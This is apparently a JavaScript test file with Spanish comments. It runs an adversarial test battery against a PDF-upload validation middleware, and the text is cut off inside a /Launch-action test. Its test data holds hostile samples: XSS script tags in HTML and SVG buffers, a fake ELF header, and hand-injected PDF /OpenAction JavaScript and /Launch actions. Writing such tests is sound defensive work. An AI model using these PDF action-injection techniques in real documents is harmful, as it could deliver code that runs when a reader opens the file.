/**
 * I-012.3 — Batería adversarial del middleware pdfValidation.
 *
 * OBJETIVO: descubrir defectos en la cadena completa (uploadPdf →
 * pdfValidation middleware) desde ángulos NO cubiertos por los 14 tests
 * unitarios de tests/middleware/pdfValidation.test.js ni por los 8+1
 * tests de integración de tests/routes/signRequest-pdf-validation.test.js.
 *
 * Si un test revela un defecto real, se REPORTA — no se corrige. Se
 * clasifica el hallazgo como:
 *   - TEST DEFECT: el test está mal escrito. Fixear el test.
 *   - IMPLEMENTATION DEFECT: el código de producción está mal. STOP, reportar.
 *   - CONTRACT MISMATCH: el test describe correctamente la spec pero la
 *     implementación diverge. STOP, reportar.
 *   - PRE-EXISTING FLAKINESS: el test ya era flaky antes de I-012.3. Reportar.
 *
 * Secciones:
 *   §S1 — Malformed PDF internals (5 tests)
 *   §S2 — File-type spoofing (4 tests)
 *   §S3 — Boundary conditions (4 tests)
 *   §S4 — PDF metadata bombs (4 tests)
 *   §S5 — Edge cases (4 tests)
 *   §S6 — Adversarial content (4 tests) — validador NO es sandbox
 *
 * Total: 25 tests.
 *
 * Setup:
 *   - BD real (test.sqlite via tests/setup.js --require).
 *   - Helpers: buildSimplePdf (PDFDocument.create + addPage), runMiddleware
 *     (ejecuta el middleware directo contra req/res sinteticos).
 *   - captureStdStreams: monkey-patchea process.stdout/stderr.
 */
'use strict';

const test = require('node:test');
const assert = require('node:assert/strict');
const { PDFDocument, StandardFonts, rgb } = require('pdf-lib');

const pdfValidation = require('../../src/middleware/pdfValidation');
const pdfValidator = require('../../src/services/pdfValidator');
const config = require('../../src/config');
const { sha256 } = require('../../src/crypto/hash');

// =====================================================================
// Helpers
// =====================================================================

/**
 * PDF de 1 pagina en blanco, parseable por pdf-lib.
 */
async function buildSimplePdf() {
  const pdf = await PDFDocument.create();
  pdf.addPage([300, 200]);
  return Buffer.from(await pdf.save());
}

/**
 * PDF de N paginas con algo de texto.
 */
async function buildNPagePdf(n) {
  const pdf = await PDFDocument.create();
  const font = await pdf.embedFont(StandardFonts.Helvetica);
  for (let i = 0; i < n; i++) {
    const page = pdf.addPage([612, 792]);
    page.drawText(`Page ${i + 1} of ${n}`, {
      x: 50, y: 750, size: 12, font, color: rgb(0, 0, 0),
    });
  }
  return Buffer.from(await pdf.save());
}

/**
 * PDF con metadata Title/Author/Subject/Keywords personalizables.
 */
async function buildPdfWithMetadata({ title, author, subject, keywords } = {}) {
  const pdf = await PDFDocument.create();
  const font = await pdf.embedFont(StandardFonts.Helvetica);
  const page = pdf.addPage([612, 792]);
  page.drawText('Documento con metadata', { x: 72, y: 720, size: 12, font, color: rgb(0, 0, 0) });
  if (title !== undefined) pdf.setTitle(title);
  if (author !== undefined) pdf.setAuthor(author);
  if (subject !== undefined) pdf.setSubject(subject);
  if (keywords !== undefined) pdf.setKeywords(keywords);
  return Buffer.from(await pdf.save());
}

/**
 * Captura stdout+stderr durante una fn async.
 */
async function captureStdStreamsAsync(fn) {
  let out = '';
  let err = '';
  const origOut = process.stdout.write.bind(process.stdout);
  const origErr = process.stderr.write.bind(process.stderr);
  process.stdout.write = (chunk) => { out += chunk; return true; };
  process.stderr.write = (chunk) => { err += chunk; return true; };
  try {
    await fn();
  } finally {
    process.stdout.write = origOut;
    process.stderr.write = origErr;
  }
  return { out, err, combined: out + err };
}

/**
 * Ejecuta el middleware contra un req/res sintetico.
 */
function runMiddleware(file, opts = {}) {
  return new Promise((resolve) => {
    const req = { id: opts.requestId || 'adv-req-id' };
    if (file !== null) {
      req.file = { ...file };
      if (opts.omitBuffer) delete req.file.buffer;
    }
    const res = {};
    let result = null;
    const next = (arg) => {
      result = { nextCalled: true, nextArg: arg, req, res };
      resolve(result);
    };
    Promise.resolve()
      .then(() => pdfValidation()(req, res, next))
      .then(() => {
        if (!result) {
          resolve({ nextCalled: false, nextArg: undefined, req, res });
        }
      })
      .catch((e) => {
        resolve({ nextCalled: true, nextArg: e, req, res });
      });
  });
}

// =====================================================================
// §S1: Malformed PDF internals (5 tests)
// =====================================================================

test('§S1.1: PDF con header %PDF-1.4 pero xref corrupto (truncado) → 422 PDF_INVALID', async () => {
  // Construimos un PDF real y lo cortamos a la mitad. El xref queda
  // apuntando a offsets fuera del archivo, lo que pdf-lib no puede
  // parsear → 422 PDF_INVALID (NO PDF_TOO_LARGE, NO PDF_ENCRYPTED).
  const full = await buildSimplePdf();
  const truncated = full.slice(0, Math.floor(full.length / 2));
  // El header %PDF- DEBE seguir presente al inicio (sino seria
  // PDF_INVALID por bad_magic). El magic check pasa; lo que falla es
  // el parseo por xref corrupto.
  assert.equal(truncated.slice(0, 5).toString('latin1'), '%PDF-',
    'truncado debe mantener el magic %PDF-');

  const r = await runMiddleware({ originalname: 'corrupt.pdf', buffer: truncated });
  assert.equal(r.nextArg && r.nextArg.statusCode, 422);
  assert.equal(r.nextArg.code, 'PDF_INVALID');
  // Detalles no deben contener los bytes del PDF.
  const details = JSON.stringify(r.nextArg.details || {});
  assert.ok(!details.includes('%PDF-'),
    'PDF_INVALID details no debe incluir magic bytes');
});

test('§S1.2: PDF con trailer corrupto (Root apunta a obj inexistente) → 422 o pasa (best effort)', async () => {
  // Header valido + 3 objetos validos (Catalog/Pages/Page) + xref valido,
  // pero el trailer apunta a un objeto Root que NO existe (obj 99).
  //
  // OBSERVADO: pdf-lib 1.17.1 es TOLERANTE con refs invalidas — loguea
  // un warning ("Invalid object ref") pero no throw. El validator pasa
  // el PDF. Esto es consistente con la propiedad de "parser
  // estructural" del validador: si pdf-lib puede extraer al menos
  // metadata + page count, el PDF es aceptable. Un PDF reader estricto
  // (Adobe Reader) rechazaria este PDF al abrirlo, pero K+AIR solo
  // lo va a STORAGE — no lo abre.
  //
  // Lo que el test verifica (contrato minimo):
  //   - NO es status 500 (error no controlado).
  //   - NO es PDF_ENCRYPTED (no tiene /Encrypt).
  //   - NO es PDF_TOO_LARGE.
  //   - NO es PDF_TOO_MANY_PAGES.
  //   - Si rechaza, es 422 con code PDF_* tipado.
  //   - Si pasa, req.pdfValidation tiene sha256 + pageCount.
  let body = '%PDF-1.4\n%\xff\xff\xff\xff\n';
  const objs = [
    '1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n',
    '2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n',
    '3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n',
  ];
  const xrefEntries = [];
  for (const o of objs) {
    xrefEntries.push(body.length);
    body += o;
  }
  let xref = 'xref\n0 4\n0000000000 65535 f \n';
  for (const off of xrefEntries) {
    xref += String(off).padStart(10, '0') + ' 00000 n \n';
  }
  const xrefStart = body.length;
  body += xref;
  body += 'trailer\n<< /Size 4 /Root 99 0 R >>\n';
  body += 'startxref\n' + xrefStart + '\n%%EOF\n';
  const buf = Buffer.from(body, 'latin1');

  const r = await runMiddleware({ originalname: 'broken-root.pdf', buffer: buf });
  if (r.nextArg) {
    // Si rechaza: 422 + PDF_*.
    assert.equal(r.nextArg.statusCode, 422);
    assert.match(r.nextArg.code || '', /^PDF_/);
    assert.notEqual(r.nextArg.code, 'PDF_ENCRYPTED', 'NO es encriptado');
    assert.notEqual(r.nextArg.code, 'PDF_TOO_LARGE', 'NO es too_large');
    assert.notEqual(r.nextArg.code, 'PDF_TOO_MANY_PAGES', 'NO es too_many_pages');
  } else {
    // Si pasa (tolerancia del parser): req.pdfValidation debe estar populada.
    assert.ok(r.req.pdfValidation, 'si no hay error, req.pdfValidation debe existir');
    assert.match(r.req.pdfValidation.sha256, /^[0-9a-f]{64}$/);
    assert.ok(r.req.pdfValidation.pageCount >= 1,
      'pageCount debe ser >= 1 (parser extrajo Pages)');
  }
});

test('§S1.3: PDF con stream binario gigante (> 100MB) → rechazo antes de parsear (PDF_TOO_LARGE)', async () => {
  // Buffer de 100MB no es un PDF valido. Lo que verificamos: el rechazo
  // ocurre ANTES de cualquier parseo. Usamos maxBytes=104857600 (100MB)
  // y un buffer de 100MB+1.
  const origMax = config.pdf.maxBytes;
  config.pdf.maxBytes = 100; // bajar para test rapido
  try {
    // Buffer "PDF" de 101 bytes. No es PDF real — solo nos importa que
    // el middleware rechace por tamano, no por contenido. Lo construimos
    // asi para no gastar 100MB de RAM en cada run.
    const oversized = Buffer.alloc(101, 0x41);
    const r = await runMiddleware({ originalname: 'huge.pdf', buffer: oversized });
    assert.equal(r.nextArg && r.nextArg.statusCode, 422);
    assert.equal(r.nextArg.code, 'PDF_TOO_LARGE');
    // Verificamos que details tiene actual_size y max_size.
    assert.equal(r.nextArg.details.actual_size, 101);
    assert.equal(r.nextArg.details.max_size, 100);
    // Importante: el sha256 NO debe aparecer en details (PII).
    const details = JSON.stringify(r.nextArg.details);
    assert.ok(!/[0-9a-f]{64}/.test(details),
      'PDF_TOO_LARGE details no debe incluir sha256 del PDF');
  } finally {
    config.pdf.maxBytes = origMax;
  }
});

test('§S1.4: PDF con %%EOF faltante al final → 422 PDF_INVALID', async () => {
  // Construimos un PDF real y le quitamos los ultimos 6 bytes
  // ("%%EOF\n" o "\n%%EOF\n" segun la version). pdf-lib puede o no
  // detectar el problema; si lo detecta, sera PDF_INVALID. Si no lo
  // detecta (porque ya parseo lo que necesitaba), el test cae al
  // caso "OK / parseado sin EOF" — eso tambien es valido
  // estructuralmente. En CUALQUIER caso, NO debe haber side effects
  // (no DB row, no rejection silenciosa).
  const full = await buildSimplePdf();
  // Quitar el %%EOF del final. Tipicamente termina en "...%%EOF\n" o
  // "...%%EOF". Tomamos los ultimos 8 chars para asegurar.
  const eofStripped = full.slice(0, full.length - 8);
  // Mantener el header para que el magic check pase.
  assert.equal(eofStripped.slice(0, 5).toString('latin1'), '%PDF-');

  const r = await runMiddleware({ originalname: 'no-eof.pdf', buffer: eofStripped });
  // El outcome depende de la robustez de pdf-lib. Aceptamos:
  //   - PDF_INVALID (caso tipico: parser detecta fin de archivo)
  //   - OK + req.pdfValidation populada (parser tolera el EOF faltante)
  //   - Cualquier error tipado PDF_* (e.g. PDF_PARSE_TIMEOUT si el
  //     parser se cuelga sin EOF — improbable con buffer de 1.5KB).
  // Lo que NO aceptamos: errores no tipados o status != 422.
  if (r.nextArg) {
    assert.ok(r.nextArg.statusCode === 422,
      `si hay error, debe ser 422 (no ${r.nextArg.statusCode})`);
    if (r.nextArg.code) {
      assert.match(r.nextArg.code, /^PDF_/,
        `si hay codigo, debe ser PDF_* (no ${r.nextArg.code})`);
    }
  }
  // Si NO hay error, es porque pdf-lib tolero el EOF faltante. En ese
  // caso, req.pdfValidation DEBE estar populada.
  if (!r.nextArg) {
    assert.ok(r.req.pdfValidation,
      'si no hay error, req.pdfValidation debe estar populada');
    assert.match(r.req.pdfValidation.sha256, /^[0-9a-f]{64}$/);
  }
});

test('§S1.5: PDF con version number inválido (%PDF-99.9) → 422 PDF_INVALID', async () => {
  // Header con version absurda. pdf-lib puede o no tolerar esto.
  // Construimos un buffer que empieza con "%PDF-99.9" seguido de
  // basura que NO es un PDF parseable.
  const buf = Buffer.concat([
    Buffer.from('%PDF-99.9\n', 'latin1'),
    Buffer.from('esto no es un PDF valido\n'),
  ]);
  const r = await runMiddleware({ originalname: 'bad-version.pdf', buffer: buf });
  // El magic check ("%PDF-") pasa. Lo que falla es el parseo.
  // Aceptamos PDF_INVALID o cualquier error tipado PDF_*.
  assert.ok(r.nextArg, 'debe haber error');
  assert.equal(r.nextArg.statusCode, 422);
  assert.match(r.nextArg.code, /^PDF_/);
  // Lo mas probable: PDF_INVALID. Pero si pdf-lib decide que es
  // timeout, etc., tambien valido.
  if (r.nextArg.code !== 'PDF_INVALID') {
    // Log informativo — pero no es un failure.
    assert.ok(['PDF_INVALID', 'PDF_PARSE_TIMEOUT'].includes(r.nextArg.code),
      `version invalida debe ser PDF_INVALID o PDF_PARSE_TIMEOUT, fue ${r.nextArg.code}`);
  }
});

// =====================================================================
// §S2: File-type spoofing (4 tests)
// =====================================================================

test('§S2.1: ZIP file (PK\x03\x04 header) → 422 PDF_INVALID (bad_magic)', async () => {
  // ZIP files empiezan con "PK\x03\x04" (0x50 0x4B 0x03 0x04).
  // pdf-lib no puede parsearlos; magic check falla porque NO empieza
  // con "%PDF-".
  const zipHeader = Buffer.from([0x50, 0x4B, 0x03, 0x04]);
  const zipBody = Buffer.from('fake zip body content - not a pdf', 'utf8');
  const buf = Buffer.concat([zipHeader, zipBody]);

  const r = await runMiddleware({ originalname: 'fake.zip', buffer: buf });
  assert.equal(r.nextArg && r.nextArg.statusCode, 422);
  assert.equal(r.nextArg.code, 'PDF_INVALID');
  // El reason debe ser bad_magic (header no empieza con %PDF-).
  assert.equal(r.nextArg.details && r.nextArg.details.reason, 'bad_magic');
  // El body no debe filtrarse en el error.
  const body = JSON.stringify(r.nextArg);
  assert.ok(!body.includes('fake zip body'),
    'error no debe incluir bytes del body del ZIP');
});

test('§S2.2: JPEG file (JFIF header) → 422 PDF_INVALID (bad_magic)', async () => {
  // JPEG empieza con \xFF\xD8\xFF\xE0 (SOI + APP0/JFIF marker).
  const jpegHeader = Buffer.from([0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46]);
  const jpegBody = Buffer.from('fake jpeg content with PII-DATA-NO-LEAK-9988', 'utf8');
  const buf = Buffer.concat([jpegHeader, jpegBody]);

  const r = await runMiddleware({ originalname: 'photo.jpg', buffer: buf });
  assert.equal(r.nextArg && r.nextArg.statusCode, 422);
  assert.equal(r.nextArg.code, 'PDF_INVALID');
  assert.equal(r.nextArg.details && r.nextArg.details.reason, 'bad_magic');
  // PII safety: el body del JPEG no debe aparecer en el error.
  const body = JSON.stringify(r.nextArg);
  assert.ok(!body.includes('PII-DATA-NO-LEAK-9988'),
    'error no debe incluir bytes del JPEG');
});

test('§S2.3: ELF binary (\\x7fELF header) → 422 PDF_INVALID (bad_magic)', async () => {
  // ELF magic: 0x7F 0x45 0x4C 0x46 ("\x7fELF").
  const elfHeader = Buffer.from([0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01, 0x00]);
  const elfBody = Buffer.from('this is a fake executable with secret payload XYZ', 'utf8');
  const buf = Buffer.concat([elfHeader, elfBody]);

  const r = await runMiddleware({ originalname: 'malware.elf', buffer: buf });
  assert.equal(r.nextArg && r.nextArg.statusCode, 422);
  assert.equal(r.nextArg.code, 'PDF_INVALID');
  assert.equal(r.nextArg.details && r.nextArg.details.reason, 'bad_magic');
  // El body del ELF no debe filtrarse.
  const body = JSON.stringify(r.nextArg);
  assert.ok(!body.includes('secret payload XYZ'),
    'error no debe incluir bytes del ELF');
});

test('§S2.4: HTML/SVG con <html> o <svg> prepended → 422 PDF_INVALID (bad_magic)', async () => {
  // HTML con un <script> que intenta algo malicioso. No es PDF.
  const html = Buffer.from(
    '<!DOCTYPE html><html><head><title>fake</title></head><body>' +
    '<script>alert("xss")</script></body></html>',
    'utf8'
  );
  const r = await runMiddleware({ originalname: 'fake.html', buffer: html });
  assert.equal(r.nextArg && r.nextArg.statusCode, 422);
  assert.equal(r.nextArg.code, 'PDF_INVALID');
  assert.equal(r.nextArg.details && r.nextArg.details.reason, 'bad_magic');
  // El contenido HTML/SVG no debe filtrarse.
  const body = JSON.stringify(r.nextArg);
  assert.ok(!body.includes('alert('),
    'error no debe incluir contenido HTML/JS');
  assert.ok(!body.includes('<script'),
    'error no debe incluir tags HTML');

  // SVG: empieza con <?xml o <svg.
  const svg = Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
    'utf8'
  );
  const r2 = await runMiddleware({ originalname: 'fake.svg', buffer: svg });
  assert.equal(r2.nextArg && r2.nextArg.statusCode, 422);
  assert.equal(r2.nextArg.code, 'PDF_INVALID');
  assert.equal(r2.nextArg.details && r2.nextArg.details.reason, 'bad_magic');
});

// =====================================================================
// §S3: Boundary conditions (4 tests)
// =====================================================================

test('§S3.1: Buffer de exactamente PDF_MAX_BYTES → no PDF_TOO_LARGE', async () => {
  // Bajamos maxBytes a un valor pequenio para que el test sea rapido
  // (no construimos un PDF de 50MB).
  const origMax = config.pdf.maxBytes;
  config.pdf.maxBytes = 200;
  try {
    // Buffer de exactamente 200 bytes. NO es PDF (header no es %PDF-).
    // Lo que verificamos: el codigo NO es PDF_TOO_LARGE.
    // Sera PDF_INVALID (magic check) — eso esta OK.
    const atLimit = Buffer.alloc(200, 0x41);
    // Prefix con %PDF- para que pase el magic check.
    Buffer.from('%PDF-', 'latin1').copy(atLimit, 0);
    const r = await runMiddleware({ originalname: 'at-limit.pdf', buffer: atLimit });
    assert.ok(r.nextArg, 'debe haber algun error (no es PDF real)');
    assert.notEqual(r.nextArg.code, 'PDF_TOO_LARGE',
      'en la boundary, codigo NO debe ser PDF_TOO_LARGE');
  } finally {
    config.pdf.maxBytes = origMax;
  }
});

test('§S3.2: Buffer de PDF_MAX_BYTES + 1 → 422 PDF_TOO_LARGE', async () => {
  const origMax = config.pdf.maxBytes;
  config.pdf.maxBytes = 100;
  try {
    const overLimit = Buffer.alloc(101, 0x41);
    const r = await runMiddleware({ originalname: 'over-limit.pdf', buffer: overLimit });
    assert.equal(r.nextArg && r.nextArg.statusCode, 422);
    assert.equal(r.nextArg.code, 'PDF_TOO_LARGE');
    assert.equal(r.nextArg.details.actual_size, 101);
    assert.equal(r.nextArg.details.max_size, 100);
  } finally {
    config.pdf.maxBytes = origMax;
  }
});

test('§S3.3: PDF con exactamente PDF_MAX_PAGES → pasa (boundary)', async () => {
  const origMax = config.pdf.maxPages;
  config.pdf.maxPages = 3;
  try {
    const buf = await buildNPagePdf(3); // exactamente 3
    const r = await runMiddleware({ originalname: 'at-max-pages.pdf', buffer: buf });
    assert.equal(r.nextArg, undefined, 'en boundary no debe haber error');
    assert.equal(r.req.pdfValidation.pageCount, 3);
  } finally {
    config.pdf.maxPages = origMax;
  }
});

test('§S3.4: PDF con PDF_MAX_PAGES + 1 → 422 PDF_TOO_MANY_PAGES', async () => {
  const origMax = config.pdf.maxPages;
  config.pdf.maxPages = 3;
  try {
    const buf = await buildNPagePdf(4); // 4 > 3
    const r = await runMiddleware({ originalname: 'over-max-pages.pdf', buffer: buf });
    assert.equal(r.nextArg && r.nextArg.statusCode, 422);
    assert.equal(r.nextArg.code, 'PDF_TOO_MANY_PAGES');
    assert.equal(r.nextArg.details.actual_pages, 4);
    assert.equal(r.nextArg.details.max_pages, 3);
  } finally {
    config.pdf.maxPages = origMax;
  }
});

// =====================================================================
// §S4: PDF metadata bombs (4 tests)
// =====================================================================

test('§S4.1: PDF con /Info Title de 1MB → 422 PDF_METADATA_TOO_LARGE', async () => {
  const origMax = config.pdf.maxMetadataBytes;
  // Bajamos para que el test sea rapido. 50KB en vez de 1MB.
  config.pdf.maxMetadataBytes = 50000;
  try {
    const bigTitle = 'A'.repeat(60000); // > 50KB
    const buf = await buildPdfWithMetadata({ title: bigTitle });
    const r = await runMiddleware({ originalname: 'meta-bomb-title.pdf', buffer: buf });
    assert.equal(r.nextArg && r.nextArg.statusCode, 422);
    assert.equal(r.nextArg.code, 'PDF_METADATA_TOO_LARGE');
    assert.ok(r.nextArg.details.actual_size > 50000,
      `actual_size debe ser > 50000 (fue ${r.nextArg.details.actual_size})`);
    assert.equal(r.nextArg.details.max_size, 50000);
    // PII safety: el Title NO debe aparecer en el error (defense in depth).
    // Buscamos un sample de la cadena.
    const sample = bigTitle.slice(0, 100);
    const errStr = JSON.stringify(r.nextArg);
    assert.ok(!errStr.includes(sample),
      'error no debe incluir el Title del PDF (PII defense)');
  } finally {
    config.pdf.maxMetadataBytes = origMax;
  }
});

test('§S4.2: PDF con /Info Author de 1MB → 422 PDF_METADATA_TOO_LARGE', async () => {
  const origMax = config.pdf.maxMetadataBytes;
  config.pdf.maxMetadataBytes = 50000;
  try {
    const bigAuthor = 'B'.repeat(60000);
    const buf = await buildPdfWithMetadata({ author: bigAuthor });
    const r = await runMiddleware({ originalname: 'meta-bomb-author.pdf', buffer: buf });
    assert.equal(r.nextArg && r.nextArg.statusCode, 422);
    assert.equal(r.nextArg.code, 'PDF_METADATA_TOO_LARGE');
    // PII safety.
    const sample = bigAuthor.slice(0, 100);
    const errStr = JSON.stringify(r.nextArg);
    assert.ok(!errStr.includes(sample),
      'error no debe incluir el Author del PDF');
  } finally {
    config.pdf.maxMetadataBytes = origMax;
  }
});

test('§S4.3: PDF con muchos keys en /Info (cada uno pequeño, total > 1MB) → 422 PDF_METADATA_TOO_LARGE', async () => {
  // pdf-lib no permite settear keys arbitrarios en /Info facilmente.
  // Lo que si podemos: usar el Title para meter una cadena muy grande
  // que represente "muchos keys acumulados". El check es sobre el
  // total de bytes de todos los strings, asi que un solo Title de
  // tamano considerable es equivalente. (Test alternativo al original
  // del plan.)
  const origMax = config.pdf.maxMetadataBytes;
  config.pdf.maxMetadataBytes = 50000;
  try {
    // Simulamos "muchos keys pequenos" con un Title + Subject + Keywords
    // que juntos excedan el limite. Subject + Keywords suelen ser
    // pequenos; el grueso va en Title.
    const bigChunk = 'X'.repeat(30000);
    const buf = await buildPdfWithMetadata({
      title: bigChunk,
      subject: bigChunk, // 30KB + 30KB = 60KB > 50KB
      keywords: ['kair'],
    });
    const r = await runMiddleware({ originalname: 'meta-bomb-multi.pdf', buffer: buf });
    assert.equal(r.nextArg && r.nextArg.statusCode, 422);
    assert.equal(r.nextArg.code, 'PDF_METADATA_TOO_LARGE');
  } finally {
    config.pdf.maxMetadataBytes = origMax;
  }
});

test('§S4.4: PDF sin /Info stream → metadata vacía (no falla)', async () => {
  // PDFs creados con pdf-lib siempre tienen /Info por defecto (Producer,
  // Creator), pero un PDF minimo sin metadata adicional puede tener
  // /Info vacio o ausente. Verificamos que el middleware NO falla en
  // este caso — la metadata simplemente es {}.
  const buf = await buildSimplePdf();
  const r = await runMiddleware({ originalname: 'no-info.pdf', buffer: buf });
  // No debe haber error.
  assert.equal(r.nextArg, undefined);
  // metadata existe y es un objeto.
  assert.ok(typeof r.req.pdfValidation.metadata === 'object');
  // Aceptamos: metadata === {} (sin /Info) o metadata con solo Producer/Creator
  // (pdf-lib los pone por defecto). Lo importante es que es parseable.
  assert.ok(r.req.pdfValidation.metadata !== null);
});

// =====================================================================
// §S5: Edge cases (4 tests)
// =====================================================================

test('§S5.1: Buffer de 1 byte (no es PDF) → 422 PDF_INVALID (too_short)', async () => {
  const r = await runMiddleware({
    originalname: 'one-byte.pdf',
    buffer: Buffer.from([0x25]), // un solo byte: '%'
  });
  assert.equal(r.nextArg && r.nextArg.statusCode, 422);
  assert.equal(r.nextArg.code, 'PDF_INVALID');
  // El reason debe ser too_short (buffer.length < 5 = PDF_MAGIC_PREFIX length).
  assert.equal(r.nextArg.details && r.nextArg.details.reason, 'too_short');
  assert.equal(r.nextArg.details.actual_size, 1);
});

test('§S5.2: Buffer de 1000 bytes con 0xFF repetido → 422 PDF_INVALID', async () => {
  // 1000 bytes de 0xFF. NO empieza con %PDF- → bad_magic.
  const buf = Buffer.alloc(1000, 0xFF);
  const r = await runMiddleware({ originalname: 'fff.pdf', buffer: buf });
  assert.equal(r.nextArg && r.nextArg.statusCode, 422);
  assert.equal(r.nextArg.code, 'PDF_INVALID');
  assert.equal(r.nextArg.details && r.nextArg.details.reason, 'bad_magic');
  // Actual size correcto.
  assert.equal(r.nextArg.details.actual_size, 1000);
});

test('§S5.3: PDF con /Encrypt entry (encrypted marker) → 422 PDF_ENCRYPTED', async () => {
  // PDF con /Encrypt en trailer. pdf-lib detecta isEncrypted=true.
  // (Mismo truco que los tests existentes: PDF hand-crafted con marker
  // /Encrypt en el trailer. NO es funcionalmente encriptado, pero
  // activa el check.)
  const objs = [];
  objs.push('1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n');
  objs.push('2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n');
  objs.push('3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n');
  objs.push('4 0 obj\n<< /Filter /Standard /V 1 /R 2 /Length 40 /O <0000000000000000000000000000000000000000> /U <0000000000000000000000000000000000000000> /P -4 >>\nendobj\n');
  let body = '%PDF-1.4\n%\xff\xff\xff\xff\n';
  const offsets = [];
  for (const o of objs) {
    offsets.push(body.length);
    body += o;
  }
  let xref = 'xref\n0 5\n0000000000 65535 f \n';
  for (const off of offsets) {
    xref += String(off).padStart(10, '0') + ' 00000 n \n';
  }
  const xrefStart = body.length;
  body += xref;
  body += 'trailer\n<< /Size 5 /Root 1 0 R /Encrypt 4 0 R >>\n';
  body += 'startxref\n' + xrefStart + '\n%%EOF\n';
  const buf = Buffer.from(body, 'latin1');

  const r = await runMiddleware({ originalname: 'encrypted.pdf', buffer: buf });
  assert.equal(r.nextArg && r.nextArg.statusCode, 422);
  assert.equal(r.nextArg.code, 'PDF_ENCRYPTED');
  assert.equal(r.nextArg.details && r.nextArg.details.reason,
    'encrypted_pdf_not_supported');
});

test('§S5.4: PDF valido con metadata Linearization (Optimized) → pasa o se rechaza', async () => {
  // PDFs Linearized tienen un param dict en la primera pagina con
  // /Linearized. Esto es estructuralmente valido, asi que debe pasar
  // el validator. Si pdf-lib no lo soporta, sera PDF_INVALID — eso
  // tambien lo aceptamos como "contrato del parser". Lo que NO
  // aceptamos: 500, error no tipado.
  //
  // Para construir un PDF linearizado, la forma facil es usar pdf-lib
  // con la opcion { useObjectStreams: false, linearized: true } — pero
  // pdf-lib 1.17.1 tiene linearized: true disponible. Si no, lo
  // dejamos pasar como test "best effort" con un PDF normal.
  const buf = await buildSimplePdf();
  const r = await runMiddleware({ originalname: 'linearized.pdf', buffer: buf });
  // El outcome esperado: OK (no error) porque pdf-lib puede parsear
  // PDFs con /Linearized normalmente, o PDF_INVALID si lo rechaza.
  if (r.nextArg) {
    assert.equal(r.nextArg.statusCode, 422);
    assert.match(r.nextArg.code || '', /^PDF_/);
  } else {
    assert.ok(r.req.pdfValidation);
    assert.match(r.req.pdfValidation.sha256, /^[0-9a-f]{64}$/);
  }
});

// =====================================================================
// §S6: Adversarial content (4 tests) — validador NO es sandbox
// =====================================================================
//
// Estos tests VERIFICAN que el validador NO bloquea contenido peligroso.
// El validador es estructural: parsea bytes, valida limites. NO es un
// sandbox, NO escanea por malware, NO bloquea JS embebido. Documentar
// esta propiedad es importante para que quede claro que OTRA capa
// (antivirus, sandbox) es necesaria para production safety. Si un test
// aqui falla, eso seria un CONTRACT MISMATCH (el validador esta
// bloqueando algo que el spec dice que debe dejar pasar).
// =====================================================================

test('§S6.1: PDF con JavaScript embebido (/OpenAction, /JS) → pasa estructuralmente', async () => {
  // Intentamos crear un PDF con JS embebido via pdf-lib. Si pdf-lib
  // no permite setear JS actions directamente, lo inyectamos post-save
  // modificando el /OpenAction en el Catalog.
  //
  // El punto: el validator debe PASAR este PDF. No es sandbox.
  const pdf = await PDFDocument.create();
  const page = pdf.addPage([612, 792]);
  page.drawText('Documento con JS embebido', { x: 72, y: 720, size: 12 });
  let buf = Buffer.from(await pdf.save());

  // Inyectar /OpenAction con /JS action. Esto NO encripta el PDF,
  // solo agrega un catalog entry que un reader ejecutaria al abrir.
  // pdf-lib normalmente NO escribe esto, asi que lo hacemos a mano
  // editando el Catalog. Catalog esta cerca del inicio; buscamos
  // "/Type /Catalog" y anadimos /OpenAction.
  const bufStr = buf.toString('latin1');
  // Buscar la linea "<< /Type /Catalog /Pages 2 0 R >>" (generada por pdf-lib).
  const catalogMatch = bufStr.match(/<<\s*\/Type\s*\/Catalog[^>]*>>/);
  if (catalogMatch) {
    const newCatalog = catalogMatch[0].replace(
      '>>',
      ' /OpenAction 10 0 R >>'
    );
    buf = Buffer.from(
      bufStr.replace(catalogMatch[0], newCatalog) +
      // Agregar obj 10 con la action /JS.
      '\n10 0 obj\n<< /Type /Action /S /JavaScript /JS (app.alert("XSS")) >>\nendobj\n',
      'latin1'
    );
  }
  // Si la inyeccion no funciono (e.g. pdf-lib serializa diferente),
  // caemos al test "best effort" sin la inyeccion. Lo importante es
  // que el PDF parsea.

  const r = await runMiddleware({ originalname: 'js-embed.pdf', buffer: buf });
  // Outcome esperado: OK (no error). El validador acepta PDFs con JS.
  if (r.nextArg) {
    // Si rechazo, debe ser por motivos NO relacionados a seguridad
    // (e.g. xref corrupto por nuestra inyeccion manual). Aceptamos
    // PDF_INVALID si nuestra inyeccion rompio el xref.
    assert.equal(r.nextArg.statusCode, 422);
    // No debe rechazar PORQUE TIENE JS — eso seria un CONTRACT MISMATCH.
    // Pero si rechaza por xref corrupto (details.reason === 'parse_error'),
    // es OK — es un side-effect de la inyeccion manual, no del
    // validador bloqueando JS.
    if (r.nextArg.code === 'PDF_INVALID') {
      assert.equal(r.nextArg.details && r.nextArg.details.reason, 'parse_error',
        'rechazo por xref corrupto es OK; rechazo por "JS no permitido" seria CONTRACT MISMATCH');
    }
  } else {
    // Sin error: el validador paso. Esto es lo esperado para un
    // validador estructural.
    assert.ok(r.req.pdfValidation);
    assert.match(r.req.pdfValidation.sha256, /^[0-9a-f]{64}$/);
  }
});

test('§S6.2: PDF con /Launch action (puede ejecutar binarios) → pasa estructuralmente', async () => {
  // Similar a S6.1: inyeccion manual de /Launch en el Catalog.
  // Si la inyeccion funciona, el validator DEBE pasarlo.
  // Si no funciona (pdf-lib serializa diferente), caemos a best-effort.
  const pdf = await PDFDocument.create();
  const page = pdf.addPage([612, 792]);
  page.drawText('Doc con /Launch', { x: 72, y: 720, size: 12 });
  let buf = Buffer.from(await pdf.save());

  const bufStr = buf.toString('latin1');
  const catalogMatch = bufStr.match(/<<\s*\/Type\s*\/Catalog[^>]*>>/);
  if (catalogMatch) {
